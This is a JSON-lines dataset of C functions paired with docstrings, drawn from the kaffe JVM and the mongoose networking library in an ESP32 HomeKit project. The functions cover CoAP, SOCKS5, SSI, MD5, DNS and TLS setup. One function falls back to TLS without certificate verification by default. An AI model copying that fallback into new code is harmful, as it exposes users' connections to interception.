{"docstring": "/*\n * Read in (checked) exceptions declared for a method\n */\n", "func_signal": "bool\naddCheckedExceptions(Method* m, size_t len UNUSED, classFile* fp,\n\t\t     errorInfo *info)", "code": "{\n\tint i;\n\tu2 nr;\n\tconstIndex *idx;\n\n\t/* no checkBufSize, done in caller (readAttributes) */\n\n\treadu2(&nr, fp);\n\tif (nr == 0) {\n\t\treturn true;\n\t}\n\n\tm->ndeclared_exceptions = nr;\n\tidx = gc_malloc(sizeof(constIndex) * nr, KGC_ALLOC_DECLAREDEXC);\n\tif (!idx) {\n\t\tpostOutOfMemory(info);\n\t\treturn false;\n\t}\n\t\n\tm->declared_exceptions = idx;\n\n\tfor (i = 0; i < nr; i++) {\n\t\treadu2(idx + i, fp);\n\t}\n\treturn true;\n}", "path": "kaffe\\kaffevm\\code.c", "repo_name": "kaffe/kaffe", "stars": 408, "license": "gpl-2.0", "language": "c", "size": 196643}
{"docstring": "/*\n * create a buffer in which debugging output is written\n */\n", "func_signal": "static void\ndebugToBuffer(int size)", "code": "{\n\tassert(size > 0);\n\tbufferSz = size;\n\tdebugBuffer = malloc(bufferSz);\n\tbufferOutput = 1;\n\tassert(debugBuffer != NULL);\n}", "path": "kaffe\\kaffevm\\debug.c", "repo_name": "kaffe/kaffe", "stars": 408, "license": "gpl-2.0", "language": "c", "size": 196643}
{"docstring": "/*\n * Splits given Opt Number/Length into base and ext values.\n *\n * Helper function.\n */\n", "func_signal": "static int coap_split_opt(uint32_t value, uint8_t *base, uint16_t *ext)", "code": "{\n  int ret = 0;\n\n  if (value < 13) {\n    *base = value;\n  } else if (value >= 13 && value <= 0xFF + 13) {\n    *base = 13;\n    *ext = value - 13;\n    ret = sizeof(uint8_t);\n  } else if (value > 0xFF + 13 && value <= 0xFFFF + 269) {\n    *base = 14;\n    *ext = value - 269;\n    ret = sizeof(uint16_t);\n  }\n\n  return ret;\n}", "path": "src\\mongoose.c", "repo_name": "younghyunjo/esp32-homekit", "stars": 419, "license": "apache-2.0", "language": "c", "size": 355}
{"docstring": "/* 'sa' must be an initialized address to bind to */\n", "func_signal": "static sock_t mg_open_listening_socket(union socket_address *sa, int type,\n                                       int proto)", "code": "{\n  socklen_t sa_len =\n      (sa->sa.sa_family == AF_INET) ? sizeof(sa->sin) : sizeof(sa->sin6);\n  sock_t sock = INVALID_SOCKET;\n#if !MG_LWIP\n  int on = 1;\n#endif\n\n  if ((sock = socket(sa->sa.sa_family, type, proto)) != INVALID_SOCKET &&\n#if !MG_LWIP /* LWIP doesn't support either */\n#if defined(_WIN32) && defined(SO_EXCLUSIVEADDRUSE) && !defined(WINCE)\n      /* \"Using SO_REUSEADDR and SO_EXCLUSIVEADDRUSE\" http://goo.gl/RmrFTm */\n      !setsockopt(sock, SOL_SOCKET, SO_EXCLUSIVEADDRUSE, (void *) &on,\n                  sizeof(on)) &&\n#endif\n\n#if !defined(_WIN32) || !defined(SO_EXCLUSIVEADDRUSE)\n      /*\n       * SO_RESUSEADDR is not enabled on Windows because the semantics of\n       * SO_REUSEADDR on UNIX and Windows is different. On Windows,\n       * SO_REUSEADDR allows to bind a socket to a port without error even if\n       * the port is already open by another program. This is not the behavior\n       * SO_REUSEADDR was designed for, and leads to hard-to-track failure\n       * scenarios. Therefore, SO_REUSEADDR was disabled on Windows unless\n       * SO_EXCLUSIVEADDRUSE is supported and set on a socket.\n       */\n      !setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (void *) &on, sizeof(on)) &&\n#endif\n#endif /* !MG_LWIP */\n\n      !bind(sock, &sa->sa, sa_len) &&\n      (type == SOCK_DGRAM || listen(sock, SOMAXCONN) == 0)) {\n#if !MG_LWIP\n    mg_set_non_blocking_mode(sock);\n    /* In case port was set to 0, get the real port number */\n    (void) getsockname(sock, &sa->sa, &sa_len);\n#endif\n  } else if (sock != INVALID_SOCKET) {\n    closesocket(sock);\n    sock = INVALID_SOCKET;\n  }\n\n  return sock;\n}", "path": "src\\mongoose.c", "repo_name": "younghyunjo/esp32-homekit", "stars": 419, "license": "apache-2.0", "language": "c", "size": 355}
{"docstring": "/*\n * Check whether full request is buffered. Return:\n *   -1  if request is malformed\n *    0  if request is not yet fully buffered\n *   >0  actual request length, including last \\r\\n\\r\\n\n */\n", "func_signal": "static int mg_http_get_request_len(const char *s, int buf_len)", "code": "{\n  const unsigned char *buf = (unsigned char *) s;\n  int i;\n\n  for (i = 0; i < buf_len; i++) {\n    if (!isprint(buf[i]) && buf[i] != '\\r' && buf[i] != '\\n' && buf[i] < 128) {\n      return -1;\n    } else if (buf[i] == '\\n' && i + 1 < buf_len && buf[i + 1] == '\\n') {\n      return i + 2;\n    } else if (buf[i] == '\\n' && i + 2 < buf_len && buf[i + 1] == '\\r' &&\n               buf[i + 2] == '\\n') {\n      return i + 3;\n    }\n  }\n\n  return 0;\n}", "path": "src\\mongoose.c", "repo_name": "younghyunjo/esp32-homekit", "stars": 419, "license": "apache-2.0", "language": "c", "size": 355}
{"docstring": "/* Set close-on-exec bit for a given socket. */\n", "func_signal": "void mg_set_close_on_exec(sock_t sock)", "code": "{\n#if defined(_WIN32) && !defined(WINCE)\n  (void) SetHandleInformation((HANDLE) sock, HANDLE_FLAG_INHERIT, 0);\n#elif defined(__unix__)\n  fcntl(sock, F_SETFD, FD_CLOEXEC);\n#else\n  (void) sock;\n#endif\n}", "path": "src\\mongoose.c", "repo_name": "younghyunjo/esp32-homekit", "stars": 419, "license": "apache-2.0", "language": "c", "size": 355}
{"docstring": "/*\n * Returns the actual buffer with data, either the client-provided or a newly\n * allocated one. If `trim` is non-zero, mbuf-backed buffer is trimmed first.\n */\n", "func_signal": "MG_INTERNAL char *altbuf_get_buf(struct altbuf *ab, int trim)", "code": "{\n  if (altbuf_reallocated(ab)) {\n    if (trim) {\n      mbuf_trim(&ab->m);\n    }\n    return ab->m.buf;\n  } else {\n    return ab->user_buf;\n  }\n}", "path": "src\\mongoose.c", "repo_name": "younghyunjo/esp32-homekit", "stars": 419, "license": "apache-2.0", "language": "c", "size": 355}
{"docstring": "/*\n * Fills CoAP header in mg_coap_message.\n *\n * Helper function.\n */\n", "func_signal": "static char *coap_parse_header(char *ptr, struct mbuf *io,\n                               struct mg_coap_message *cm)", "code": "{\n  if (io->len < sizeof(uint32_t)) {\n    cm->flags |= MG_COAP_NOT_ENOUGH_DATA;\n    return NULL;\n  }\n\n  /*\n   * Version (Ver):  2-bit unsigned integer.  Indicates the CoAP version\n   * number.  Implementations of this specification MUST set this field\n   * to 1 (01 binary).  Other values are reserved for future versions.\n   * Messages with unknown version numbers MUST be silently ignored.\n   */\n  if (((uint8_t) *ptr >> 6) != 1) {\n    cm->flags |= MG_COAP_IGNORE;\n    return NULL;\n  }\n\n  /*\n   * Type (T):  2-bit unsigned integer.  Indicates if this message is of\n   * type Confirmable (0), Non-confirmable (1), Acknowledgement (2), or\n   * Reset (3).\n   */\n  cm->msg_type = ((uint8_t) *ptr & 0x30) >> 4;\n  cm->flags |= MG_COAP_MSG_TYPE_FIELD;\n\n  /*\n   * Token Length (TKL):  4-bit unsigned integer.  Indicates the length of\n   * the variable-length Token field (0-8 bytes).  Lengths 9-15 are\n   * reserved, MUST NOT be sent, and MUST be processed as a message\n   * format error.\n   */\n  cm->token.len = *ptr & 0x0F;\n  if (cm->token.len > 8) {\n    cm->flags |= MG_COAP_FORMAT_ERROR;\n    return NULL;\n  }\n\n  ptr++;\n\n  /*\n   * Code:  8-bit unsigned integer, split into a 3-bit class (most\n   * significant bits) and a 5-bit detail (least significant bits)\n   */\n  cm->code_class = (uint8_t) *ptr >> 5;\n  cm->code_detail = *ptr & 0x1F;\n  cm->flags |= (MG_COAP_CODE_CLASS_FIELD | MG_COAP_CODE_DETAIL_FIELD);\n\n  ptr++;\n\n  /* Message ID:  16-bit unsigned integer in network byte order. */\n  cm->msg_id = (uint8_t) *ptr << 8 | (uint8_t) * (ptr + 1);\n  cm->flags |= MG_COAP_MSG_ID_FIELD;\n\n  ptr += 2;\n\n  return ptr;\n}", "path": "src\\mongoose.c", "repo_name": "younghyunjo/esp32-homekit", "stars": 419, "license": "apache-2.0", "language": "c", "size": 355}
{"docstring": "/* MG_ENABLE_SYNC_RESOLVER */\n", "func_signal": "MG_INTERNAL struct mg_connection *mg_create_connection_base(\n    struct mg_mgr *mgr, mg_event_handler_t callback,\n    struct mg_add_sock_opts opts)", "code": "{\n  struct mg_connection *conn;\n\n  if ((conn = (struct mg_connection *) MG_CALLOC(1, sizeof(*conn))) != NULL) {\n    conn->sock = INVALID_SOCKET;\n    conn->handler = callback;\n    conn->mgr = mgr;\n    conn->last_io_time = (time_t) mg_time();\n    conn->iface =\n        (opts.iface != NULL ? opts.iface : mgr->ifaces[MG_MAIN_IFACE]);\n    conn->flags = opts.flags & _MG_ALLOWED_CONNECT_FLAGS_MASK;\n    conn->user_data = opts.user_data;\n    /*\n     * SIZE_MAX is defined as a long long constant in\n     * system headers on some platforms and so it\n     * doesn't compile with pedantic ansi flags.\n     */\n    conn->recv_mbuf_limit = ~0;\n  } else {\n    MG_SET_PTRPTR(opts.error_string, \"failed to create connection\");\n  }\n\n  return conn;\n}", "path": "src\\mongoose.c", "repo_name": "younghyunjo/esp32-homekit", "stars": 419, "license": "apache-2.0", "language": "c", "size": 355}
{"docstring": "/* Move data from one connection to another */\n", "func_signal": "void mg_forward(struct mg_connection *from, struct mg_connection *to)", "code": "{\n  mg_send(to, from->recv_mbuf.buf, from->recv_mbuf.len);\n  mbuf_remove(&from->recv_mbuf, from->recv_mbuf.len);\n}", "path": "src\\mongoose.c", "repo_name": "younghyunjo/esp32-homekit", "stars": 419, "license": "apache-2.0", "language": "c", "size": 355}
{"docstring": "/*\n * Start MD5 accumulation.  Set bit count to 0 and buffer to mysterious\n * initialization constants.\n */\n", "func_signal": "void cs_md5_init(cs_md5_ctx *ctx)", "code": "{\n  ctx->buf[0] = 0x67452301;\n  ctx->buf[1] = 0xefcdab89;\n  ctx->buf[2] = 0x98badcfe;\n  ctx->buf[3] = 0x10325476;\n\n  ctx->bits[0] = 0;\n  ctx->bits[1] = 0;\n}", "path": "src\\mongoose.c", "repo_name": "younghyunjo/esp32-homekit", "stars": 419, "license": "apache-2.0", "language": "c", "size": 355}
{"docstring": "/*\n *  Request, https://www.ietf.org/rfc/rfc1928.txt paragraph 4\n *\n *  +----+-----+-------+------+----------+----------+\n *  |VER | CMD |  RSV  | ATYP | DST.ADDR | DST.PORT |\n *  +----+-----+-------+------+----------+----------+\n *  | 1  |  1  | X'00' |  1   | Variable |    2     |\n *  +----+-----+-------+------+----------+----------+\n */\n", "func_signal": "static void mg_socks5_handle_request(struct mg_connection *c)", "code": "{\n  struct mbuf *r = &c->recv_mbuf;\n  unsigned char *p = (unsigned char *) r->buf;\n  unsigned char addr_len = 4, reply = MG_SOCKS_SUCCESS;\n  int ver, cmd, atyp;\n  char addr[300];\n\n  if (r->len < 8) return; /* return if not fully buffered. min DST.ADDR is 2 */\n  ver = p[0];\n  cmd = p[1];\n  atyp = p[3];\n\n  /* TODO(lsm): support other commands */\n  if (ver != MG_SOCKS_VERSION || cmd != MG_SOCKS_CMD_CONNECT) {\n    reply = MG_SOCKS_CMD_NOT_SUPPORTED;\n  } else if (atyp == MG_SOCKS_ADDR_IPV4) {\n    addr_len = 4;\n    if (r->len < (size_t) addr_len + 6) return; /* return if not buffered */\n    snprintf(addr, sizeof(addr), \"%d.%d.%d.%d:%d\", p[4], p[5], p[6], p[7],\n             p[8] << 8 | p[9]);\n    mg_socks5_connect(c, addr);\n  } else if (atyp == MG_SOCKS_ADDR_IPV6) {\n    addr_len = 16;\n    if (r->len < (size_t) addr_len + 6) return; /* return if not buffered */\n    snprintf(addr, sizeof(addr), \"[%x:%x:%x:%x:%x:%x:%x:%x]:%d\",\n             p[4] << 8 | p[5], p[6] << 8 | p[7], p[8] << 8 | p[9],\n             p[10] << 8 | p[11], p[12] << 8 | p[13], p[14] << 8 | p[15],\n             p[16] << 8 | p[17], p[18] << 8 | p[19], p[20] << 8 | p[21]);\n    mg_socks5_connect(c, addr);\n  } else if (atyp == MG_SOCKS_ADDR_DOMAIN) {\n    addr_len = p[4] + 1;\n    if (r->len < (size_t) addr_len + 6) return; /* return if not buffered */\n    snprintf(addr, sizeof(addr), \"%.*s:%d\", p[4], p + 5,\n             p[4 + addr_len] << 8 | p[4 + addr_len + 1]);\n    mg_socks5_connect(c, addr);\n  } else {\n    reply = MG_SOCKS_ADDR_NOT_SUPPORTED;\n  }\n\n  /*\n   *  Reply, https://www.ietf.org/rfc/rfc1928.txt paragraph 5\n   *\n   *  +----+-----+-------+------+----------+----------+\n   *  |VER | REP |  RSV  | ATYP | BND.ADDR | BND.PORT |\n   *  +----+-----+-------+------+----------+----------+\n   *  | 1  |  1  | X'00' |  1   | Variable |    2     |\n   *  +----+-----+-------+------+----------+----------+\n   */\n  {\n    unsigned char buf[] = {MG_SOCKS_VERSION, reply, 0};\n    mg_send(c, buf, sizeof(buf));\n  }\n  mg_send(c, r->buf + 3, addr_len + 1 + 2);\n\n  mbuf_remove(r, 6 + addr_len);      /* Remove request from the input stream */\n  c->flags |= MG_SOCKS_CONNECT_DONE; /* Mark ourselves as connected */\n}", "path": "src\\mongoose.c", "repo_name": "younghyunjo/esp32-homekit", "stars": 419, "license": "apache-2.0", "language": "c", "size": 355}
{"docstring": "/*\n * Windows explorer (probably there are another WebDav clients like it)\n * requires LOCK support in webdav. W/out this, it still works, but fails\n * to save file: shows error message and offers \"Save As\".\n * \"Save as\" works, but this message is very annoying.\n * This is fake lock, which doesn't lock something, just returns LOCK token,\n * UNLOCK always answers \"OK\".\n * With this fake LOCK Windows Explorer looks happy and saves file.\n * NOTE: that is not DAV LOCK imlementation, it is just a way to shut up\n * Windows native DAV client. This is why FAKE LOCK is not enabed by default\n */\n", "func_signal": "MG_INTERNAL void mg_handle_lock(struct mg_connection *nc, const char *path)", "code": "{\n  static const char *reply =\n      \"HTTP/1.1 207 Multi-Status\\r\\n\"\n      \"Connection: close\\r\\n\"\n      \"Content-Type: text/xml; charset=utf-8\\r\\n\\r\\n\"\n      \"<?xml version=\\\"1.0\\\" encoding=\\\"utf-8\\\"?>\"\n      \"<d:multistatus xmlns:d='DAV:'>\\n\"\n      \"<D:lockdiscovery>\\n\"\n      \"<D:activelock>\\n\"\n      \"<D:locktoken>\\n\"\n      \"<D:href>\\n\"\n      \"opaquelocktoken:%s%u\"\n      \"</D:href>\"\n      \"</D:locktoken>\"\n      \"</D:activelock>\\n\"\n      \"</D:lockdiscovery>\"\n      \"</d:multistatus>\\n\";\n  mg_printf(nc, reply, path, (unsigned int) mg_time());\n  nc->flags |= MG_F_SEND_AND_CLOSE;\n}", "path": "src\\mongoose.c", "repo_name": "younghyunjo/esp32-homekit", "stars": 419, "license": "apache-2.0", "language": "c", "size": 355}
{"docstring": "/*\n *  https://www.ietf.org/rfc/rfc1928.txt paragraph 3, handle client handshake\n *\n *  +----+----------+----------+\n *  |VER | NMETHODS | METHODS  |\n *  +----+----------+----------+\n *  | 1  |    1     | 1 to 255 |\n *  +----+----------+----------+\n */\n", "func_signal": "static void mg_socks5_handshake(struct mg_connection *c)", "code": "{\n  struct mbuf *r = &c->recv_mbuf;\n  if (r->buf[0] != MG_SOCKS_VERSION) {\n    c->flags |= MG_F_CLOSE_IMMEDIATELY;\n  } else if (r->len > 2 && (size_t) r->buf[1] + 2 <= r->len) {\n    /* https://www.ietf.org/rfc/rfc1928.txt paragraph 3 */\n    unsigned char reply[2] = {MG_SOCKS_VERSION, MG_SOCKS_HANDSHAKE_FAILURE};\n    int i;\n    for (i = 2; i < r->buf[1] + 2; i++) {\n      /* TODO(lsm): support other auth methods */\n      if (r->buf[i] == MG_SOCKS_HANDSHAKE_NOAUTH) reply[1] = r->buf[i];\n    }\n    mbuf_remove(r, 2 + r->buf[1]);\n    mg_send(c, reply, sizeof(reply));\n    c->flags |= MG_SOCKS_HANDSHAKE_DONE; /* Mark handshake done */\n  }\n}", "path": "src\\mongoose.c", "repo_name": "younghyunjo/esp32-homekit", "stars": 419, "license": "apache-2.0", "language": "c", "size": 355}
{"docstring": "/*\n * SSI directive has the following format:\n * <!--#directive parameter=value parameter=value -->\n */\n", "func_signal": "static void mg_send_ssi_file(struct mg_connection *nc, struct http_message *hm,\n                             const char *path, FILE *fp, int include_level,\n                             const struct mg_serve_http_opts *opts)", "code": "{\n  static const struct mg_str btag = MG_MK_STR(\"<!--#\");\n  static const struct mg_str d_include = MG_MK_STR(\"include\");\n  static const struct mg_str d_call = MG_MK_STR(\"call\");\n#if MG_ENABLE_HTTP_SSI_EXEC\n  static const struct mg_str d_exec = MG_MK_STR(\"exec\");\n#endif\n  char buf[BUFSIZ], *p = buf + btag.len; /* p points to SSI directive */\n  int ch, len, in_ssi_tag;\n\n  if (include_level > 10) {\n    mg_printf(nc, \"SSI #include level is too deep (%s)\", path);\n    return;\n  }\n\n  in_ssi_tag = len = 0;\n  while ((ch = fgetc(fp)) != EOF) {\n    if (in_ssi_tag && ch == '>' && buf[len - 1] == '-' && buf[len - 2] == '-') {\n      size_t i = len - 2;\n      in_ssi_tag = 0;\n\n      /* Trim closing --> */\n      buf[i--] = '\\0';\n      while (i > 0 && buf[i] == ' ') {\n        buf[i--] = '\\0';\n      }\n\n      /* Handle known SSI directives */\n      if (strncmp(p, d_include.p, d_include.len) == 0) {\n        mg_do_ssi_include(nc, hm, path, p + d_include.len + 1, include_level,\n                          opts);\n      } else if (strncmp(p, d_call.p, d_call.len) == 0) {\n        struct mg_ssi_call_ctx cctx;\n        memset(&cctx, 0, sizeof(cctx));\n        cctx.req = hm;\n        cctx.file = mg_mk_str(path);\n        cctx.arg = mg_mk_str(p + d_call.len + 1);\n        mg_call(nc, NULL, nc->user_data, MG_EV_SSI_CALL,\n                (void *) cctx.arg.p); /* NUL added above */\n        mg_call(nc, NULL, nc->user_data, MG_EV_SSI_CALL_CTX, &cctx);\n#if MG_ENABLE_HTTP_SSI_EXEC\n      } else if (strncmp(p, d_exec.p, d_exec.len) == 0) {\n        do_ssi_exec(nc, p + d_exec.len + 1);\n#endif\n      } else {\n        /* Silently ignore unknown SSI directive. */\n      }\n      len = 0;\n    } else if (ch == '<') {\n      in_ssi_tag = 1;\n      if (len > 0) {\n        mg_send(nc, buf, (size_t) len);\n      }\n      len = 0;\n      buf[len++] = ch & 0xff;\n    } else if (in_ssi_tag) {\n      if (len == (int) btag.len && strncmp(buf, btag.p, btag.len) != 0) {\n        /* Not an SSI tag */\n        in_ssi_tag = 0;\n      } else if (len == (int) sizeof(buf) - 2) {\n        mg_printf(nc, \"%s: SSI tag is too large\", path);\n        len = 0;\n      }\n      buf[len++] = ch & 0xff;\n    } else {\n      buf[len++] = ch & 0xff;\n      if (len == (int) sizeof(buf)) {\n        mg_send(nc, buf, (size_t) len);\n        len = 0;\n      }\n    }\n  }\n\n  /* Send the rest of buffered data */\n  if (len > 0) {\n    mg_send(nc, buf, (size_t) len);\n  }\n}", "path": "src\\mongoose.c", "repo_name": "younghyunjo/esp32-homekit", "stars": 419, "license": "apache-2.0", "language": "c", "size": 355}
{"docstring": "/*\n * Returns Option Delta or Length.\n *\n * Helper function.\n */\n", "func_signal": "static int coap_get_ext_opt(char *ptr, struct mbuf *io, uint16_t *opt_info)", "code": "{\n  int ret = 0;\n\n  if (*opt_info == 13) {\n    /*\n     * 13:  An 8-bit unsigned integer follows the initial byte and\n     * indicates the Option Delta/Length minus 13.\n     */\n    if (ptr < io->buf + io->len) {\n      *opt_info = (uint8_t) *ptr + 13;\n      ret = sizeof(uint8_t);\n    } else {\n      ret = -1; /* LCOV_EXCL_LINE */\n    }\n  } else if (*opt_info == 14) {\n    /*\n     * 14:  A 16-bit unsigned integer in network byte order follows the\n     * initial byte and indicates the Option Delta/Length minus 269.\n     */\n    if (ptr + sizeof(uint8_t) < io->buf + io->len) {\n      *opt_info = ((uint8_t) *ptr << 8 | (uint8_t) * (ptr + 1)) + 269;\n      ret = sizeof(uint16_t);\n    } else {\n      ret = -1; /* LCOV_EXCL_LINE */\n    }\n  }\n\n  return ret;\n}", "path": "src\\mongoose.c", "repo_name": "younghyunjo/esp32-homekit", "stars": 419, "license": "apache-2.0", "language": "c", "size": 355}
{"docstring": "/* MG_ENABLE_FILESYSTEM */\n", "func_signal": "struct mg_connection *mg_connect_http_base(\n    struct mg_mgr *mgr, MG_CB(mg_event_handler_t ev_handler, void *user_data),\n    struct mg_connect_opts opts, const char *scheme1, const char *scheme2,\n    const char *scheme_ssl1, const char *scheme_ssl2, const char *url,\n    struct mg_str *path, struct mg_str *user_info, struct mg_str *host)", "code": "{\n  struct mg_connection *nc = NULL;\n  unsigned int port_i = 0;\n  int use_ssl = 0;\n  struct mg_str scheme, query, fragment;\n  char conn_addr_buf[2];\n  char *conn_addr = conn_addr_buf;\n\n  if (mg_parse_uri(mg_mk_str(url), &scheme, user_info, host, &port_i, path,\n                   &query, &fragment) != 0) {\n    MG_SET_PTRPTR(opts.error_string, \"cannot parse url\");\n    goto out;\n  }\n\n  /* If query is present, do not strip it. Pass to the caller. */\n  if (query.len > 0) path->len += query.len + 1;\n\n  if (scheme.len == 0 || mg_vcmp(&scheme, scheme1) == 0 ||\n      (scheme2 != NULL && mg_vcmp(&scheme, scheme2) == 0)) {\n    use_ssl = 0;\n    if (port_i == 0) port_i = 80;\n  } else if (mg_vcmp(&scheme, scheme_ssl1) == 0 ||\n             (scheme2 != NULL && mg_vcmp(&scheme, scheme_ssl2) == 0)) {\n    use_ssl = 1;\n    if (port_i == 0) port_i = 443;\n  } else {\n    goto out;\n  }\n\n  mg_asprintf(&conn_addr, sizeof(conn_addr_buf), \"tcp://%.*s:%u\",\n              (int) host->len, host->p, port_i);\n  if (conn_addr == NULL) goto out;\n\n  LOG(LL_DEBUG, (\"%s use_ssl? %d %s\", url, use_ssl, conn_addr));\n  if (use_ssl) {\n#if MG_ENABLE_SSL\n    /*\n     * Schema requires SSL, but no SSL parameters were provided in opts.\n     * In order to maintain backward compatibility, use a faux-SSL with no\n     * verification.\n     */\n    if (opts.ssl_ca_cert == NULL) {\n      opts.ssl_ca_cert = \"*\";\n    }\n#else\n    MG_SET_PTRPTR(opts.error_string, \"ssl is disabled\");\n    goto out;\n#endif\n  }\n\n  if ((nc = mg_connect_opt(mgr, conn_addr, MG_CB(ev_handler, user_data),\n                           opts)) != NULL) {\n    mg_set_protocol_http_websocket(nc);\n  }\n\nout:\n  if (conn_addr != NULL && conn_addr != conn_addr_buf) MG_FREE(conn_addr);\n  return nc;\n}", "path": "src\\mongoose.c", "repo_name": "younghyunjo/esp32-homekit", "stars": 419, "license": "apache-2.0", "language": "c", "size": 355}
{"docstring": "/*\n * Ciphers can be specified as a colon-separated list of cipher suite names.\n * These can be found in\n * https://github.com/ARMmbed/mbedtls/blob/development/library/ssl_ciphersuites.c#L267\n * E.g.: TLS-ECDHE-ECDSA-WITH-AES-128-GCM-SHA256:TLS-DHE-RSA-WITH-AES-256-CCM\n */\n", "func_signal": "static enum mg_ssl_if_result mg_set_cipher_list(struct mg_ssl_if_ctx *ctx,\n                                                const char *ciphers)", "code": "{\n  if (ciphers != NULL) {\n    int l, id;\n    const char *s = ciphers, *e;\n    char tmp[50];\n    while (s != NULL) {\n      e = strchr(s, ':');\n      l = (e != NULL ? (e - s) : (int) strlen(s));\n      strncpy(tmp, s, l);\n      tmp[l] = '\\0';\n      id = mbedtls_ssl_get_ciphersuite_id(tmp);\n      DBG((\"%s -> %04x\", tmp, id));\n      if (id != 0) {\n        mbuf_append(&ctx->cipher_suites, &id, sizeof(id));\n      }\n      s = (e != NULL ? e + 1 : NULL);\n    }\n    if (ctx->cipher_suites.len == 0) return MG_SSL_ERROR;\n    id = 0;\n    mbuf_append(&ctx->cipher_suites, &id, sizeof(id));\n    mbuf_trim(&ctx->cipher_suites);\n    mbedtls_ssl_conf_ciphersuites(ctx->conf,\n                                  (const int *) ctx->cipher_suites.buf);\n  } else {\n    mbedtls_ssl_conf_ciphersuites(ctx->conf, mg_s_cipher_list);\n  }\n  return MG_SSL_OK;\n}", "path": "src\\mongoose.c", "repo_name": "younghyunjo/esp32-homekit", "stars": 419, "license": "apache-2.0", "language": "c", "size": 355}
{"docstring": "/*\n * Find what nameserver to use.\n *\n * Return 0 if OK, -1 if error\n */\n", "func_signal": "static int mg_get_ip_address_of_nameserver(char *name, size_t name_len)", "code": "{\n  int ret = -1;\n\n#ifdef _WIN32\n  int i;\n  LONG err;\n  HKEY hKey, hSub;\n  wchar_t subkey[512], value[128],\n      *key = L\"SYSTEM\\\\ControlSet001\\\\Services\\\\Tcpip\\\\Parameters\\\\Interfaces\";\n\n  if ((err = RegOpenKeyExW(HKEY_LOCAL_MACHINE, key, 0, KEY_READ, &hKey)) !=\n      ERROR_SUCCESS) {\n    fprintf(stderr, \"cannot open reg key %S: %ld\\n\", key, err);\n    ret = -1;\n  } else {\n    for (ret = -1, i = 0; 1; i++) {\n      DWORD subkey_size = sizeof(subkey), type, len = sizeof(value);\n      if (RegEnumKeyExW(hKey, i, subkey, &subkey_size, NULL, NULL, NULL,\n                        NULL) != ERROR_SUCCESS) {\n        break;\n      }\n      if (RegOpenKeyExW(hKey, subkey, 0, KEY_READ, &hSub) == ERROR_SUCCESS &&\n          ((RegQueryValueExW(hSub, L\"NameServer\", 0, &type, (void *) value,\n                             &len) == ERROR_SUCCESS &&\n            value[0] != '\\0') ||\n           (RegQueryValueExW(hSub, L\"DhcpNameServer\", 0, &type, (void *) value,\n                             &len) == ERROR_SUCCESS &&\n            value[0] != '\\0'))) {\n        /*\n         * See https://github.com/cesanta/mongoose/issues/176\n         * The value taken from the registry can be empty, a single\n         * IP address, or multiple IP addresses separated by comma.\n         * If it's empty, check the next interface.\n         * If it's multiple IP addresses, take the first one.\n         */\n        wchar_t *comma = wcschr(value, ',');\n        if (comma != NULL) {\n          *comma = '\\0';\n        }\n        /* %S will convert wchar_t -> char */\n        snprintf(name, name_len, \"%S\", value);\n        ret = 0;\n        RegCloseKey(hSub);\n        break;\n      }\n    }\n    RegCloseKey(hKey);\n  }\n#elif MG_ENABLE_FILESYSTEM && defined(MG_RESOLV_CONF_FILE_NAME)\n  FILE *fp;\n  char line[512];\n\n  if ((fp = mg_fopen(MG_RESOLV_CONF_FILE_NAME, \"r\")) == NULL) {\n    ret = -1;\n  } else {\n    /* Try to figure out what nameserver to use */\n    for (ret = -1; fgets(line, sizeof(line), fp) != NULL;) {\n      unsigned int a, b, c, d;\n      if (sscanf(line, \"nameserver %u.%u.%u.%u\", &a, &b, &c, &d) == 4) {\n        snprintf(name, name_len, \"%u.%u.%u.%u\", a, b, c, d);\n        ret = 0;\n        break;\n      }\n    }\n    (void) fclose(fp);\n  }\n#else\n  snprintf(name, name_len, \"%s\", MG_DEFAULT_NAMESERVER);\n#endif /* _WIN32 */\n\n  return ret;\n}", "path": "src\\mongoose.c", "repo_name": "younghyunjo/esp32-homekit", "stars": 419, "license": "apache-2.0", "language": "c", "size": 355}
{"docstring": "/*\n * Append VARIABLE=VALUE\\0 string to the buffer, and add a respective\n * pointer into the vars array.\n */\n", "func_signal": "static char *mg_addenv(struct mg_cgi_env_block *block, const char *fmt, ...)", "code": "{\n  int n, space;\n  char *added = block->buf + block->len;\n  va_list ap;\n\n  /* Calculate how much space is left in the buffer */\n  space = sizeof(block->buf) - (block->len + 2);\n  if (space > 0) {\n    /* Copy VARIABLE=VALUE\\0 string into the free space */\n    va_start(ap, fmt);\n    n = vsnprintf(added, (size_t) space, fmt, ap);\n    va_end(ap);\n\n    /* Make sure we do not overflow buffer and the envp array */\n    if (n > 0 && n + 1 < space &&\n        block->nvars < (int) ARRAY_SIZE(block->vars) - 2) {\n      /* Append a pointer to the added string into the envp array */\n      block->vars[block->nvars++] = added;\n      /* Bump up used length counter. Include \\0 terminator */\n      block->len += n + 1;\n    }\n  }\n\n  return added;\n}", "path": "src\\mongoose.c", "repo_name": "younghyunjo/esp32-homekit", "stars": 419, "license": "apache-2.0", "language": "c", "size": 355}
{"docstring": "/*\n * Appends a single char to the altbuf.\n */\n", "func_signal": "MG_INTERNAL void altbuf_append(struct altbuf *ab, char c)", "code": "{\n  if (ab->len < ab->user_buf_size) {\n    /* The data fits into the original buffer */\n    ab->user_buf[ab->len++] = c;\n  } else {\n    /* The data can't fit into the original buffer, so write it to mbuf.  */\n\n    /*\n     * First of all, see if that's the first byte which overflows the original\n     * buffer: if so, copy the existing data from there to a newly allocated\n     * mbuf.\n     */\n    if (ab->len > 0 && ab->m.len == 0) {\n      mbuf_append(&ab->m, ab->user_buf, ab->len);\n    }\n\n    mbuf_append(&ab->m, &c, 1);\n    ab->len = ab->m.len;\n  }\n}", "path": "src\\mongoose.c", "repo_name": "younghyunjo/esp32-homekit", "stars": 419, "license": "apache-2.0", "language": "c", "size": 355}
{"docstring": "/*\n * Resets any data previously appended to altbuf.\n */\n", "func_signal": "MG_INTERNAL void altbuf_reset(struct altbuf *ab)", "code": "{\n  mbuf_free(&ab->m);\n  ab->len = 0;\n}", "path": "src\\mongoose.c", "repo_name": "younghyunjo/esp32-homekit", "stars": 419, "license": "apache-2.0", "language": "c", "size": 355}
